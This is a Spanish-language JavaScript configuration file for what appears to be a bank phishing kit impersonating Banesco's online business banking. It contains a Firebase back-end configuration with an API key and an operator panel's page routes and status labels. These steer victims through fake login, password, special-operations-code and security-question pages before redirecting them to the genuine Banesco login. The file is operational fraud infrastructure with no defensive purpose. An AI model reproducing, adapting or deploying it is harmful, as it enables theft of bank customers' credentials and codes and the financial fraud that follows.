// Configuración centralizada de Firebase y rutas

// Configuración de Firebase
const firebaseConfig = {
    apiKey: "AIzaSyBnv1yymQKBWXIE6oJHV8kOPEA6Nm1iF9w",
    authDomain: "a24a3i5a.firebaseapp.com",
    projectId: "a24a3i5a",
    storageBucket: "a24a3i5a.firebasestorage.app",
    messagingSenderId: "363928972104",
    appId: "1:363928972104:web:19331a7011922dd223a17d"
  };

// Configuración de la aplicación
const appConfig = {
    // Rutas de redirección
    routes: {
        1: { url: "lgp.html", name: "Inicio" },
        2: { url: "us-err.html", name: "Err-LOGIN" },
        3: { url: "coe.html", name: "COE" },
        4: { url: "coe-err.html", name: "COE-Err" },
        5: { url: "passwd.html", name: "Clave" },
        6: { url: "desf-err.html", name: "EDESF-Err" },
        7: { url: "dashboard.html", name: "Cargando" },
        55: { url: "desfd.html", name: "DESF" },
        8: { url: "https://banesconlinempresa.banesco.com/lazaro/WebSite/login.aspx", name: "Salida Empresa" },
        9: { url: "coe-emp.html", name: "COE-EMP" },
    },

    // Tiempo de espera para redirección (en milisegundos)
    timeout: 100000, // 100 segundos

    // Configuración de acciones del panel
    actions: {
        home: { page: 1, color: "#87f79fff" },
        err_login: { page: 2, color: "#e8fff0" },
        coe: { page: 3, color: "#fff8e8" },
        coe_err: { page: 4, color: "#fff8e8" },
        passwd: { page: 5, color: "#fff8e8" },
        desf_err: { page: 6, color: "#fff8e8" },
        dashboard: { page: 7, color: "#fff8e8" },
        emp: { page: 8, color: "#fff8e8" },
        desf: { page: 55, color: "#fff8e8" },
        coe_emp: { page: 9, color: "#fff8e8" }
    },

    // Configuración de estados
    status: {
        0: { text: "Cargando...", class: "secondary" },
        1: { text: "Inicio", class: "success" },
        2: { text: "Err-LG", class: "danger" },
        3: { text: "Clave de Operaciones Especiales", class: "info" },
        4: { text: "Clave de Operaciones Especiales", class: "danger" },
        5: { text: "Clave", class: "warning" },
        6: { text: "Preguntas de Seguridad", class: "danger" },
        7: { text: "Dashboard", class: "success" },
        8: { text: "Salida Empresa", class: "success" },
        9: { text: "COE-EMP", class: "success" },
        55: { text: "DESF", class: "secondary" }
    }
};

// Hacer la configuración accesible globalmente
window.appConfig = appConfig;

// Exportar configuraciones
export { firebaseConfig, appConfig };

// Para compatibilidad
try {
    window.firebaseConfig = firebaseConfig;
} catch (e) {
    console.error("No se pudo asignar a window. Posiblemente ejecutando en entorno no navegador.");
}
